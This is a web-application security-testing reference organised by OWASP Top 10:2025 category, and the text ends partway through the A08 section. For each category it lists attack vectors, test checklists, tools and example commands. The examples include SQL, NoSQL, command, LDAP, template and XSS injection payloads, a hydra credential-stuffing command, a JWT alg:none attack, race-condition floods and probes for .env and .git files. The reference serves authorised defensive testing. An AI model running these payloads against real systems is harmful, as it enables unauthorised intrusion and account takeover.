# OWASP Top 10:2025 — Web Application Security Reference

> Source: <https://owasp.org/Top10/2025/>
> Last reviewed: 2026-05-01
> Audience: QA engineers, security testers, and developers running pre-release security checks against web applications.

The OWASP Top 10 is the de-facto baseline for web application security risks. Every category below is mapped to real CWE IDs, real tools, and real payloads you can run from the command line or from a proxy such as Burp Suite or OWASP ZAP. Use this reference together with the `qa-owasp-security` skill to drive structured reviews and pre-release gates.

**AUTHORIZATION REQUIREMENT.** Active scanning, payload injection, brute force, and exploitation activities described below are only legal against systems you own or have explicit, written permission to test. Before running any of the example commands against a target, confirm scope with the system owner and your engagement letter (or local equivalent). Running these against third-party systems without authorization is a crime in most jurisdictions (Computer Fraud and Abuse Act in the US, Ley 26.388 in Argentina, Computer Misuse Act in the UK, etc.). When in doubt, scope down to a local instance, a deliberately vulnerable lab (`OWASP Juice Shop`, `DVWA`, `WebGoat`), or a public bug bounty program with documented rules of engagement.

## Quick reference

| ID | Title | One-line summary |
|----|-------|------------------|
| A01:2025 | Broken Access Control | Users acting outside their intended permissions due to missing or bypassable authorization checks. |
| A02:2025 | Security Misconfiguration | Insecure defaults, missing hardening, leaky errors, and exposed admin/management surfaces. |
| A03:2025 | Software Supply Chain Failures | Compromise of third-party code, build pipelines, registries, or update channels feeding the app. |
| A04:2025 | Cryptographic Failures | Missing, weak, or misused cryptography for data in transit and at rest, including key management. |
| A05:2025 | Injection | Untrusted input reaching an interpreter (SQL, OS, LDAP, XPath, template, browser DOM) as code. |
| A06:2025 | Insecure Design | Missing or ineffective control design that no amount of clean implementation can fix. |
| A07:2025 | Authentication Failures | Weak login, session, or recovery flows allowing impersonation or account takeover. |
| A08:2025 | Software or Data Integrity Failures | Trusting code, updates, or serialized data without integrity verification. |
| A09:2025 | Security Logging and Alerting Failures | Insufficient logs, monitoring, or response capability to detect and contain incidents. |
| A10:2025 | Mishandling of Exceptional Conditions | Crashes, leaks, or business-state corruption when unexpected conditions occur. |

---

## A01:2025 — Broken Access Control

### Definition

Access control enforces policy so users cannot act outside of their intended permissions. Failures result in unauthorized information disclosure, modification or destruction of data, or performing business functions outside the user's scope. OWASP measured broken access control in 100% of tested applications in the 2025 dataset.

### Common attack vectors

- Least-privilege violations: access granted to "any authenticated user" instead of a specific role.
- URL or state manipulation: parameter tampering, force browsing to authenticated pages, modifying hidden form fields.
- Insecure Direct Object References (IDOR): swapping `userId=42` for `userId=43` to read another user's data.
- Missing controls on POST, PUT, PATCH, DELETE while GET is protected.
- Vertical privilege escalation: standard user reaching admin endpoints (`/admin/*`).
- Horizontal privilege escalation: tenant A reading tenant B's records.
- Metadata tampering: editing JWT `role` claim, cookie flags, or signed tokens with weak verification.
- Permissive CORS (`Access-Control-Allow-Origin: *` with credentials, or reflected origin without allow-list).
- Force browsing to unlinked pages: `/backup.zip`, `/.git/`, `/api/v1/internal/*`.

### How to test

Manual checklist:

- [ ] Build an authorization matrix: roles x endpoints x HTTP methods x expected result (200/401/403).
- [ ] Log in as a low-privilege user; replay every admin request from that user's session.
- [ ] For each resource ID in the URL or body, swap with an ID owned by another user/tenant.
- [ ] Try every HTTP verb against each endpoint (GET, POST, PUT, PATCH, DELETE, OPTIONS).
- [ ] Remove the `Authorization` header / session cookie and replay.
- [ ] Decode JWTs; flip `role`, `admin`, `tenant_id` claims; resubmit unsigned (`alg: none`) and with HS256-vs-RS256 confusion.
- [ ] Probe `/.git/`, `/.env`, `/backup`, `/admin`, `/swagger`, `/actuator/*`, `/api/internal/*`.
- [ ] Send cross-origin `fetch` from an attacker-controlled origin to test CORS.

Automated approach: use Burp Suite "Autorize" or "AuthMatrix" extension, OWASP ZAP "Access Control Testing" add-on, and contract-level tests (Postman/Newman, Playwright API tests) that assert 401/403 for unauthorized roles.

### Tools

- Burp Suite Pro + Autorize, AuthMatrix, JWT Editor extensions
- OWASP ZAP with Access Control Testing add-on
- `ffuf` / `gobuster` / `feroxbuster` for forced browsing
- `jwt_tool` for JWT manipulation
- `nuclei` templates `cves/` and `exposures/` for sensitive-file discovery
- Playwright/Cypress contract tests asserting 401/403 by role

### Example payloads / commands

```bash
# IDOR probe: low-priv user (token A) reading high-priv user's profile
curl -i -H "Authorization: Bearer $TOKEN_A" \
  https://app.example.com/api/users/1/profile

# Verb tampering: GET allowed, try DELETE
curl -i -X DELETE -H "Authorization: Bearer $TOKEN_A" \
  https://app.example.com/api/users/42

# Force-browsing common admin paths
ffuf -u https://app.example.com/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt -mc 200,301,302,401,403

# JWT alg:none attack
jwt_tool eyJhbGciOi... -X a

# CORS reflection check
curl -i -H "Origin: https://attacker.tld" https://app.example.com/api/me
# Look for: Access-Control-Allow-Origin: https://attacker.tld
#           Access-Control-Allow-Credentials: true
```

### What "passing" looks like

- Every protected endpoint returns 401 (no auth) or 403 (wrong role/owner) under negative tests.
- Authorization decisions happen server-side, not in the client.
- Deny-by-default: any new endpoint requires explicit allow-listing.
- IDOR tests for every entity (user, order, document, tenant) are part of the regression suite.
- Logs capture authorization failures with user, resource, and action; rate limiting kicks in on repeated failures.
- CORS allow-list is explicit; no wildcard with credentials.

### Mapping

- CWE-22 (Path Traversal), CWE-23 (Relative Path Traversal), CWE-35, CWE-59
- CWE-200 (Information Exposure), CWE-201, CWE-219
- CWE-264, CWE-275, CWE-284 (Improper Access Control), CWE-285 (Improper Authorization)
- CWE-352 (CSRF), CWE-359, CWE-377, CWE-402, CWE-425 (Forced Browsing)
- CWE-639 (Authorization Bypass via User-Controlled Key), CWE-862 (Missing Authorization), CWE-863 (Incorrect Authorization), CWE-918 (SSRF)
- Related: OWASP API Security Top 10 — API1 Broken Object Level Authorization, API3 Broken Object Property Level Authorization, API5 Broken Function Level Authorization. OWASP Mobile Top 10 — M1 Improper Credential Usage, M3 Insecure Authentication/Authorization.

---

## A02:2025 — Security Misconfiguration

### Definition

Security misconfiguration is when a system, application, or cloud service is set up incorrectly from a security perspective, creating vulnerabilities. This includes missing hardening, default credentials, verbose errors, and missing or weak security headers across any layer of the stack.

### Common attack vectors

- Default accounts and passwords (`admin/admin`, `tomcat/tomcat`, `root/root`).
- Sample applications (e.g., Tomcat manager, phpMyAdmin) deployed in production.
- Directory listing enabled exposing source, backups, or configs.
- Verbose stack traces disclosing framework versions, file paths, SQL fragments.
- Missing security headers: `Content-Security-Policy`, `Strict-Transport-Security`, `X-Content-Type-Options`, `Referrer-Policy`, `Permissions-Policy`, `X-Frame-Options`.
- Open S3 buckets, public Azure Blob containers, public GCS buckets.
- Unpatched components, deprecated TLS (TLS 1.0/1.1, SSLv3), weak ciphers.
- Cloud IAM with `*:*` permissions; service accounts with administrative scopes.
- Debug endpoints exposed: `/actuator/*`, `/debug/pprof`, `/_debug/`, `?debug=1`.

### How to test

Manual checklist:

- [ ] Enumerate exposed paths and headers; compare to a hardening baseline (CIS, vendor benchmarks).
- [ ] Try framework default credentials and sample apps.
- [ ] Trigger errors (malformed JSON, divide-by-zero in a parameter, oversized input) and inspect responses.
- [ ] Check TLS configuration: protocols, ciphers, certificate, HSTS preload.
- [ ] Inspect cloud storage ACLs and IAM policies.
- [ ] Review Dockerfiles and Kubernetes manifests for `privileged: true`, `runAsRoot`, missing `securityContext`.

Automated approach: ZAP Active Scan with all "Server Security" rules, `nuclei` exposure templates, `testssl.sh`, `nikto`, `trivy config`, `kube-bench`, `prowler` for AWS/Azure/GCP.

### Tools

- OWASP ZAP, Burp Suite (Header Audit, Software Vulnerability Scanner)
- `nuclei -t http/exposures/ -t http/misconfiguration/`
- `testssl.sh -U <host>` for TLS posture
- `nikto -h <host>` for web server defaults
- `trivy config <dir>` for IaC misconfig
- `kube-bench`, `kube-hunter` for Kubernetes
- `prowler -p <profile>` for AWS misconfiguration
- `gitleaks detect` for committed secrets

### Example payloads / commands

```bash
# Header audit
curl -sI https://app.example.com | grep -iE 'strict-transport|content-security|x-content-type|x-frame|referrer|permissions-policy'

# TLS posture
testssl.sh --severity HIGH https://app.example.com

# Framework debug surfaces
for p in /actuator/env /actuator/heapdump /debug/pprof /server-status /.git/HEAD /.env /robots.txt; do
  curl -s -o /dev/null -w "%{http_code} $p\n" https://app.example.com$p
done

# Trigger verbose error
curl -s 'https://app.example.com/api/items?id=%00%FF'

# Cloud misconfiguration sweep (AWS)
prowler aws --severity high critical

# IaC scan
trivy config ./infra --severity HIGH,CRITICAL
```

### What "passing" looks like

- All security headers set to their hardened values; HSTS preload-eligible.
- No default credentials, no sample apps, no debug endpoints reachable in production.
- TLS 1.2+ only, modern cipher suites, valid certificates, OCSP stapling.
- Errors returned to users are generic; full traces only in server logs.
- Hardening is automated (Ansible/Terraform/Helm) and verified by CI scans on every change.
- Cloud storage and IAM follow least-privilege; periodic review documented.

### Mapping

- CWE-2, CWE-11, CWE-13, CWE-15, CWE-16 (Configuration), CWE-260, CWE-315, CWE-520
- CWE-526 (Exposure of Sensitive Info Through Env Vars), CWE-537, CWE-541, CWE-547
- CWE-611 (XXE — restricted external entity), CWE-614, CWE-756, CWE-776, CWE-942 (Permissive CORS), CWE-1004, CWE-1032
- CWE-489 (Active Debug Code), CWE-1174
- Related: OWASP API Security Top 10 — API8 Security Misconfiguration. OWASP Mobile Top 10 — M8 Security Misconfiguration.

---

## A03:2025 — Software Supply Chain Failures

### Definition

Software supply chain failures are breakdowns or other compromises in the process of building, distributing, or updating software. They are often caused by vulnerabilities or malicious changes in third-party code, tools, or other dependencies that the system relies on. This 2025 category broadens the prior "Vulnerable and Outdated Components" entry to cover the full build-and-deliver chain.

### Common attack vectors

- Vendor compromise: trusted upstream is breached and ships malware in a signed update (SolarWinds 2019).
- Conditional malicious behavior: backdoor only fires under specific conditions, evading testing (Bybit 2025).
- Worms in package ecosystems: `Shai-Hulud` npm worm (2025) used post-install scripts to harvest tokens and republish to additional packages.
- Vulnerable components: exploitable CVEs in dependencies (CVE-2017-5638 Struts 2, CVE-2021-44228 Log4Shell).
- Typosquatting: `reqeusts`, `colorss`, `expresss` masquerading as popular libraries.
- Dependency confusion: internal package name resolved from the public registry first.
- Compromised build infrastructure: tampered CI runners, exfiltrated signing keys, malicious GitHub Actions.
- Untrusted installers fetched from CDNs without checksum verification.

### How to test

Manual checklist:

- [ ] Generate and review an SBOM (CycloneDX or SPDX).
- [ ] Diff dependency tree against a known-good baseline; flag new transitive deps.
- [ ] Verify lockfile integrity (`package-lock.json`, `poetry.lock`, `go.sum`, `Cargo.lock`).
- [ ] Confirm publisher and signature for every binary pulled at build time.
- [ ] Inspect CI/CD: who can push to main, who can release, are runners ephemeral, are secrets scoped.
- [ ] Look for `postinstall`, `preinstall`, `prepublish` scripts in npm packages added recently.
- [ ] Track CVEs against the SBOM continuously, not just at release time.

Automated approach: SCA tools in CI failing the build on high/critical findings, signed commits and artifacts (Sigstore/cosign), SLSA build levels, image-signing verification at deploy.

### Tools

- `syft` (SBOM generation), `grype` (vuln matching), `trivy fs` and `trivy image`
- `snyk test`, `snyk monitor`
- OWASP `dependency-check`, `dependency-track`
- `osv-scanner` (Google OSV)
- `retire.js` for client-side JS libraries
- `cosign` / Sigstore for artifact signatures
- `gitleaks`, `trufflehog` for committed secrets
- GitHub Dependabot, Renovate

### Example payloads / commands

```bash
# Generate SBOM
syft packages dir:. -o cyclonedx-json > sbom.json

# Vulnerability scan
grype sbom:sbom.json --fail-on high

# Container image scan
trivy image --severity HIGH,CRITICAL myorg/app:1.4.2

# Filesystem + IaC scan
trivy fs --scanners vuln,secret,misconfig .

# Snyk in CI (exits non-zero on high)
snyk test --severity-threshold=high

# Verify image signature
cosign verify --certificate-identity-regexp '.*@myorg\.com' \
              --certificate-oidc-issuer 'https://accounts.google.com' \
              ghcr.io/myorg/app:1.4.2

# Detect committed secrets
gitleaks detect --redact --report-format sarif --report-path gitleaks.sarif
```

### What "passing" looks like

- SBOM is generated for every build and stored alongside artifacts.
- High/critical CVEs block the pipeline; exceptions require a documented, time-boxed waiver.
- All third-party artifacts are pulled from pinned, signed sources; signatures verified at install time.
- CI/CD has separation of duties, MFA, ephemeral runners, and scoped secrets.
- Internal package names are reserved on public registries to prevent confusion.
- Release rollouts are staged, with monitoring and a rollback plan.

### Mapping

- CWE-1104 (Use of Unmaintained Third Party Components), CWE-937, CWE-1035 (Vulnerable Third Party Component)
- CWE-447 (Unimplemented or Unsupported Feature in UI)
- CWE-1329 (Reliance on Component Without Integrity Check)
- CWE-1357 (Reliance on Insufficiently Trustworthy Component), CWE-1395
- Related: OWASP API Security Top 10 — touches API8/API9. OWASP Mobile Top 10 — M2 Inadequate Supply Chain Security.

---

## A04:2025 — Cryptographic Failures

### Definition

A04 covers failures related to the lack of cryptography, insufficiently strong cryptography, leaking of cryptographic keys, and related errors that often lead to exposure of sensitive data or system compromise.

### Common attack vectors

- Cleartext transmission: HTTP instead of HTTPS, plaintext SMTP/FTP, unencrypted internal traffic.
- TLS downgrade or stripping (`sslstrip`-style attacks), missing HSTS, mixed content.
- Use of broken or weak algorithms: MD5, SHA-1, DES, 3DES, RC4, ECB mode, CBC without proper MAC.
- Weak password hashing: unsalted SHA-1/SHA-256, low iteration counts, missing peppering.
- Hard-coded keys, secrets in source, secrets in environment variables exposed via `/actuator/env`.
- Weak randomness from non-CSPRNGs (`Math.random()`, `rand()`).
- Improper certificate validation: disabled hostname verification, accepting any CA.
- Caching of sensitive responses by browsers or CDNs.
- Insecure key storage: keys in same DB as encrypted data, no HSM/KMS.

### How to test

Manual checklist:

- [ ] Inventory every channel that carries sensitive data; verify TLS 1.2+ end-to-end.
- [ ] Run `testssl.sh` or `sslyze` against every public hostname.
- [ ] Inspect Set-Cookie flags: `Secure`, `HttpOnly`, `SameSite`.
- [ ] Decode JWTs and look for `alg: none`, HS256 with weak secrets, missing `exp`/`nbf`.
- [ ] Audit password storage: which algorithm, what work factor, salt length.
- [ ] Search the codebase for hard-coded keys (`gitleaks`, `trufflehog`).
- [ ] Test for caching of sensitive responses (`Cache-Control` headers).
- [ ] Check key rotation cadence and HSM/KMS usage.

Automated approach: `testssl.sh` in CI for staging hostnames, secret scanners on every commit, ZAP passive rules `tlsScanner` and `headersScanner`, semgrep rulesets `p/security-audit` and `p/secrets`.

### Tools

- `testssl.sh`, `sslyze`, `nmap --script ssl-enum-ciphers`
- `hashcat`, `john` for offline password-strength evaluation in CTF/lab
- `gitleaks`, `trufflehog`, `detect-secrets` for credential scanning
- `semgrep --config p/security-audit p/secrets`
- `mkcert` for local TLS testing
- `openssl s_client`, `openssl x509`, `openssl ciphers`
- HashiCorp Vault, AWS KMS, GCP KMS, Azure Key Vault for key management

### Example payloads / commands

```bash
# TLS posture
testssl.sh --severity LOW https://app.example.com
sslyze --regular app.example.com:443

# Inspect cert and chain
openssl s_client -connect app.example.com:443 -servername app.example.com -showcerts </dev/null

# Cookie flags
curl -sI https://app.example.com/login | grep -i set-cookie

# Search for hard-coded secrets
gitleaks detect --redact -v
trufflehog filesystem --directory . --only-verified

# Static rules for crypto misuse
semgrep --config p/security-audit --config p/secrets

# JWT inspection
echo $JWT | cut -d. -f1 | base64 -d
echo $JWT | cut -d. -f2 | base64 -d
```

### What "passing" looks like

- TLS 1.2+ everywhere, with forward secrecy, modern cipher suites, valid certs, HSTS with preload.
- Passwords stored with Argon2id, scrypt, bcrypt (cost ≥12), or PBKDF2 with high iteration counts; per-user salt.
- Keys live in an HSM or managed KMS; rotation policy is documented and tested.
- No hard-coded secrets; CI fails on any secret-scanner finding.
- Sensitive responses set `Cache-Control: no-store`.
- Plan for post-quantum migration is on the roadmap (target window before 2030).

### Mapping

- CWE-261, CWE-296, CWE-310, CWE-319 (Cleartext Transmission of Sensitive Information)
- CWE-321 (Hard-coded Cryptographic Key), CWE-322, CWE-323, CWE-324, CWE-325, CWE-326 (Inadequate Encryption Strength)
- CWE-327 (Use of Broken or Risky Cryptographic Algorithm), CWE-328, CWE-329, CWE-330, CWE-331
- CWE-335, CWE-336, CWE-337, CWE-338 (Use of Cryptographically Weak PRNG)
- CWE-340, CWE-347, CWE-523, CWE-720, CWE-757, CWE-759, CWE-760
- CWE-780, CWE-818, CWE-916
- Related: OWASP API Security Top 10 — API2 Broken Authentication (TLS portion), API3. OWASP Mobile Top 10 — M5 Insecure Communication, M9 Insecure Cryptography.

---

## A05:2025 — Injection

### Definition

An injection vulnerability occurs when untrusted user input is sent to an interpreter (browser, database, command shell, template engine) and causes the interpreter to execute parts of that input as commands. Cross-site scripting (XSS) is included as the highest-volume injection type by CVE count.

### Common attack vectors

- SQL Injection (SQLi) — classic, blind boolean, blind time-based, out-of-band.
- NoSQL Injection — MongoDB `{$ne: null}`, JavaScript-eval injection.
- OS Command Injection — `;`, `|`, `` ` ``, `$()` in parameters reaching `system()`/`exec()`.
- LDAP Injection — `*)(uid=*` style filter manipulation.
- XPath / XQuery injection in XML-driven systems.
- Server-Side Template Injection (SSTI) in Jinja2, Twig, Freemarker, Velocity.
- Expression Language Injection (`${...}`) in Spring, JSP, OGNL.
- HTTP Response Splitting (CRLF injection via `%0d%0a`).
- ORM injection via raw query concatenation in Hibernate/Sequelize/SQLAlchemy.
- Cross-Site Scripting (XSS): reflected, stored, DOM-based.
- Header injection, log injection, mail-header injection.

### How to test

Manual checklist:

- [ ] Enumerate every input: query string, body, headers, cookies, file names, file content, websockets.
- [ ] Send context-appropriate payloads for each interpreter (SQL, shell, LDAP, XPath, template, browser).
- [ ] Use error-based, boolean-based, and time-based payloads.
- [ ] Test stored injection: write payload via one endpoint, read via another.
- [ ] For XSS, test both source (where input enters) and sink (where output renders), considering CSP.
- [ ] Use polyglot payloads to cover multiple contexts at once.

Automated approach: SAST + DAST in CI. ZAP Active Scan, Burp Active Scanner, `sqlmap` against authenticated endpoints, `nuclei` injection templates. Add fuzz tests for parsers and template renderers.

### Tools

- `sqlmap` (SQLi), `NoSQLMap` (NoSQL)
- Burp Suite Active Scanner, OWASP ZAP Active Scan, `nuclei`
- `commix` (command injection), `tplmap` (SSTI)
- `dalfox` (XSS), `xsstrike`
- `semgrep --config p/owasp-top-ten p/r2c-security-audit`
- CodeQL, SonarQube for SAST
- `wfuzz`, `ffuf` for parameter fuzzing
- AFL++, libFuzzer for parser fuzzing

### Example payloads / commands

```bash
# SQL Injection (sqlmap, authenticated)
sqlmap -u "https://app.example.com/api/items?id=1" \
       --headers="Authorization: Bearer $TOKEN" \
       --level=3 --risk=2 --batch --random-agent

# Manual SQLi probe
curl "https://app.example.com/api/items?id=1' OR '1'='1"
curl "https://app.example.com/api/items?id=1; WAITFOR DELAY '0:0:5'--"

# OS command injection
curl "https://app.example.com/lookup?host=example.com;id"
commix --url="https://app.example.com/lookup?host=INJECT" --data="..."

# NoSQL injection (MongoDB)
curl -X POST https://app.example.com/login \
  -H 'Content-Type: application/json' \
  -d '{"user":"admin","pass":{"$ne":null}}'

# XSS reflected probe
curl "https://app.example.com/search?q=%3Cscript%3Ealert(1)%3C/script%3E"

# SSTI probe (Jinja2 / Twig / Freemarker)
curl "https://app.example.com/render?name={{7*7}}"
curl "https://app.example.com/render?name=\${7*7}"

# LDAP injection
curl "https://app.example.com/login?user=*)(uid=*))(|(uid=*&pass=x"

# Polyglot for multi-context coverage
'"><svg/onload=alert(1)>//`${7*7}`--><!--
```

### What "passing" looks like

- All database access uses parameterized queries or an ORM with bound parameters; no string concatenation.
- All shell/exec calls use argument arrays, never string interpolation, and prefer dedicated APIs.
- Output encoding is contextual (HTML, attribute, JS, URL, CSS) and applied at sink, not source.
- A strict Content-Security-Policy is in place with nonces or hashes; no `unsafe-inline`.
- SAST runs on every PR with zero new high/critical findings.
- DAST runs on every staging deploy and a documented penetration test on every release candidate.

### Mapping

- CWE-20 (Improper Input Validation), CWE-74, CWE-75, CWE-77 (Command Injection — generic)
- CWE-78 (OS Command Injection), CWE-79 (XSS), CWE-80 through CWE-87
- CWE-88 (Argument Injection), CWE-89 (SQL Injection), CWE-90 (LDAP Injection)
- CWE-91 (XML Injection), CWE-93 (CRLF Injection), CWE-94 (Code Injection), CWE-95 (Eval Injection), CWE-96, CWE-97, CWE-98, CWE-99
- CWE-100, CWE-113 (HTTP Response Splitting), CWE-116, CWE-138, CWE-184
- CWE-470 (Unsafe Reflection), CWE-471, CWE-564, CWE-643 (XPath), CWE-644, CWE-652 (XQuery), CWE-917 (Expression Language), CWE-1236
- Related: OWASP API Security Top 10 — API10 Unsafe Consumption of APIs (when downstream injects into us). OWASP Mobile Top 10 — M4 Insufficient Input/Output Validation.

---

## A06:2025 — Insecure Design

### Definition

Insecure design is a broad category for missing or ineffective control design. The category distinguishes between design flaws and implementation defects: a secure design can still have implementation defects, but an insecure design cannot be fixed by a perfect implementation. Threat modeling, secure design patterns, and reference architectures are the primary mitigations.

### Common attack vectors

- Business-logic abuse: bulk discount stacking, coupon reuse, race conditions in checkout, refund-and-keep.
- Bots beating humans on limited inventory (sneakers, tickets, vaccine slots) without anti-automation.
- Account recovery via security questions whose answers are public (mother's maiden name, first school).
- No rate limit, no CAPTCHA, no progressive throttling on costly operations.
- Trust-boundary violations (data crosses tenant or privilege boundary unchecked).
- Missing segmentation: monolith with no internal authorization between modules.
- Failure paths that "fail open" instead of "fail closed".
- No abuse cases or misuse cases captured in user stories.
- Lack of resource quotas per user/tenant enabling resource-exhaustion DoS by design.

### How to test

Manual checklist:

- [ ] Run a threat-modeling workshop (STRIDE, LINDDUN, PASTA) for each critical flow.
- [ ] Build abuser stories for each user story; confirm test coverage exists for each.
- [ ] Replay state transitions out of order (skip step 2, repeat step 3, race two requests).
- [ ] Probe rate limiting on login, password reset, payment, search, and any heavy endpoint.
- [ ] Test account recovery using only public information.
- [ ] Inspect tenant/data isolation by design, not just by check.

Automated approach: this category is largely manual. What you can automate: contract tests for business invariants (no negative balances, no double spends), property-based tests for state machines, chaos experiments for fail-closed behavior.

### Tools

- Threat modeling: OWASP Threat Dragon, Microsoft Threat Modeling Tool, IriusRisk
- Property-based testing: Hypothesis (Python), fast-check (TS), QuickCheck (Haskell), `gopter` (Go)
- Load and abuse: `k6`, `locust`, `vegeta`
- Anti-automation: hCaptcha, Cloudflare Turnstile, AWS WAF Bot Control
- Security design pattern catalogs: OWASP Cheat Sheet Series, OWASP ASVS, NIST SP 800-160

### Example payloads / commands

```bash
# Race condition: spawn 50 concurrent withdrawal requests
seq 1 50 | xargs -n1 -P50 -I{} curl -s -X POST \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"amount":100}' https://app.example.com/api/withdraw

# Rate-limit probe on password reset
for i in $(seq 1 200); do
  curl -s -o /dev/null -w "%{http_code}\n" \
    -X POST -d '{"email":"victim@example.com"}' \
    https://app.example.com/api/forgot
done

# State-machine skip: try to confirm checkout without paying
curl -X POST https://app.example.com/api/orders/$ID/confirm \
  -H "Authorization: Bearer $TOKEN"

# Property-based test pseudocode (Hypothesis)
@given(st.integers(min_value=-10**9, max_value=10**9))
def test_balance_never_negative(amount):
    account = Account(balance=100)
    try:
        account.withdraw(amount)
    except InsufficientFunds:
        pass
    assert account.balance >= 0
```

### What "passing" looks like

- Threat models exist for every critical flow and are reviewed each release.
- Abuser stories accompany user stories; each has explicit test coverage.
- Rate limiting and anti-automation are present on every authentication, recovery, and high-cost endpoint.
- The system fails closed: errors abort the transaction, not silently continue.
- A "paved road" of secure design patterns is documented and adopted by every team.
- Tenant isolation is enforced by design (separate schemas, row-level security) and verified by tests.

### Mapping

- CWE-73, CWE-183, CWE-209, CWE-213, CWE-235, CWE-256 (Unprotected Storage of Credentials), CWE-257
- CWE-266, CWE-269 (Improper Privilege Management), CWE-280, CWE-311, CWE-312
- CWE-419, CWE-430, CWE-434 (Unrestricted File Upload), CWE-444, CWE-451
- CWE-472, CWE-501 (Trust Boundary Violation), CWE-522 (Insufficiently Protected Credentials)
- CWE-525, CWE-539, CWE-579, CWE-598, CWE-602, CWE-642, CWE-646, CWE-650
- CWE-653, CWE-656, CWE-657, CWE-799, CWE-840, CWE-841, CWE-927, CWE-1021, CWE-1173
- Related: OWASP API Security Top 10 — API4 Unrestricted Resource Consumption, API6 Unrestricted Access to Sensitive Business Flows.

---

## A07:2025 — Authentication Failures

### Definition

When an attacker is able to trick a system into recognizing an invalid or incorrect user as legitimate, this vulnerability is present. It covers password handling, multi-factor flows, session management, and account recovery.

### Common attack vectors

- Credential stuffing using leaked password dumps.
- Password spraying with common passwords (`Spring2026!`, `Welcome1`).
- Hybrid attacks: incrementing date-suffixed passwords (`Winter2025` → `Winter2026`).
- Brute force without rate limiting or progressive delay.
- Default or weak passwords accepted (`admin/admin`, `Password1`).
- Single-factor authentication on privileged accounts.
- Weak or skippable MFA (SMS-only, OTP fallback to email, MFA not enforced on API).
- Session IDs in URLs, predictable session IDs, no session expiration.
- No session revocation after logout, password change, or role change.
- Account enumeration via different responses for valid vs invalid users.
- Insecure password recovery (security questions, predictable reset tokens, tokens that don't expire).

### How to test

Manual checklist:

- [ ] Confirm password policy aligns with NIST SP 800-63B section 5.1.1.
- [ ] Try a curated breach list against a test account (with permission); confirm rejection.
- [ ] Probe rate limiting on login, MFA verify, password reset; verify lockout/backoff behavior.
- [ ] Inspect session IDs: entropy, server-side issuance, rotation on privilege change.
- [ ] Verify MFA cannot be bypassed at the API layer or via remember-device cookies.
- [ ] Test account-enumeration via login, signup, password reset error messages and timing.
- [ ] Inspect password reset: token entropy, expiration, single-use, channel binding.
- [ ] Validate session invalidation on logout, password change, and from another device.

Automated approach: ZAP authentication scripts, Burp Intruder for credential-stuffing simulation against a test account, contract tests asserting consistent generic error messages.

### Tools

- Burp Suite Intruder + Sequencer (session entropy)
- OWASP ZAP authentication scripts and Forced User Mode
- `hydra`, `medusa`, `patator` for protocol-level brute force (lab use only)
- `haveibeenpwned` API for breach-aware password validation
- WebAuthn / FIDO2 libraries (Yubico, SimpleWebAuthn)
- Identity providers with strong defaults: Auth0, Okta, Keycloak, Cognito, AWS IAM Identity Center

### Example payloads / commands

```bash
# Credential-stuffing simulation against test account (with permission)
hydra -L users.txt -P breached-passwords.txt -f -t 4 \
      app.example.com https-post-form \
      "/api/login:user=^USER^&pass=^PASS^:F=invalid"

# Account enumeration via password reset
for u in admin@example.com nope@example.com; do
  curl -s -o /dev/null -w "%{http_code} %{time_total}s $u\n" \
    -X POST -d "{\"email\":\"$u\"}" \
    -H 'Content-Type: application/json' \
    https://app.example.com/api/forgot
done

# Session token entropy (collect 1000 cookies, then analyze)
for i in $(seq 1 1000); do
  curl -s -c - https://app.example.com/login | awk '/sessionid/ {print $7}'
done | sort -u | wc -l

# MFA bypass probe: skip the MFA step
curl -X POST -H "Authorization: Bearer $PARTIAL_TOKEN" \
  https://app.example.com/api/me
```

### What "passing" looks like

- MFA enforced on every privileged action and admin user; phishing-resistant factors (WebAuthn) preferred.
- New passwords checked against breach lists; minimum length 12+; no forced rotation without cause.
- Login, MFA, and reset endpoints rate-limited with progressive backoff and lockout.
- Sessions are server-side, high-entropy, rotated on privilege change, expire on inactivity, and revoked on logout/password change.
- Generic error messages prevent account enumeration; timing differences below the noise floor.
- Reset tokens are single-use, short-lived, channel-bound.

### Mapping

- CWE-255, CWE-259 (Hard-coded Password), CWE-287 (Improper Authentication), CWE-288, CWE-290
- CWE-294, CWE-295, CWE-297, CWE-300, CWE-302, CWE-303, CWE-304, CWE-305, CWE-306
- CWE-307 (Improper Restriction of Excessive Authentication Attempts), CWE-308, CWE-309
- CWE-346, CWE-384 (Session Fixation), CWE-521 (Weak Password Requirements)
- CWE-613 (Insufficient Session Expiration), CWE-620, CWE-640, CWE-798 (Hard-coded Credentials)
- CWE-940, CWE-1216
- Related: OWASP API Security Top 10 — API2 Broken Authentication. OWASP Mobile Top 10 — M3 Insecure Authentication/Authorization.

---

## A08:2025 — Software or Data Integrity Failures

### Definition

A08 covers failures to maintain trust boundaries and verify the integrity of software, code, and data artifacts. Code and infrastructure that does not protect against invalid or untrusted code or data being treated as trusted leads to remote code execution, malicious updates, and deserialization attacks.

### Common attack vectors

- Untrusted dependencies: plugins, libraries, modules from unverified registries or CDNs.
- CI/CD pipeline pulling artifacts without integrity verification (no checksums, no signatures).
- Auto-update mechanisms that don't verify signatures of downloaded updates.
- Insecure deserialization: untrusted Java/.NET/Python/PHP serialized objects, YAML with `!!python/object`, Pickle.
- Unsigned JavaScript bundles loaded from public CDNs without Subresource Integrity.
- Data exchanged via cookies/JWT/hidden fields without HMAC or signature verification.
- Acceptance of plaintext or unsigned configuration changes from clients.

### How to test

Manual checklist:

- [ ] Trace every artifact in your build to its source; demand a signature.
- [ ] Search the codebase for `pickle.loads`, `yaml.load` (unsafe), `ObjectInputStream`, `BinaryFormatter`, `unserialize`, `Marshal.load`.
- [ ] Verify all `<script>` tags from external CDNs use `integrity=""` (SRI) and `crossorigin=""`.
- [ ] Check that updates verify a signature before applying.
- [ ] Inspect signed cookies/JWTs for HMAC verification with a strong key, not user-controlled.
- [ ] Audit CI/CD: who can push, who can release, are artifacts signed at the gate.

Automated approach: SAST rules for unsafe deserialization, SCA for dependency provenance, signed-commit enforcement, Sigstore/cosign verification gates, SLSA build-level checks.

### Tools

- `cosign` (signature verification), Sigstore, in-toto for SLSA
- `ysoserial` (Java) / `ysoserial.net` for deserialization payload generation in lab
- `phpggc` for PHP gadget chains
- `semgrep --config p/insecure-transport p/owasp-top-ten`
- CodeQL queries: `java/unsafe-deserialization`, `python/unsafe-pickle`
- SRI generators (`openssl dgst -sha384 -binary file.js | openssl base64 -A`)

### Example payloads / commands

```bash
# Detect unsafe deserialization sinks
semgrep --config p/owasp-top-ten --include '*.java' --include '*.py' --include '*.rb' .
codeql database analyze db.codeql --format=sarif-latest \
  --output=results.sarif python-security-and-quality.qls

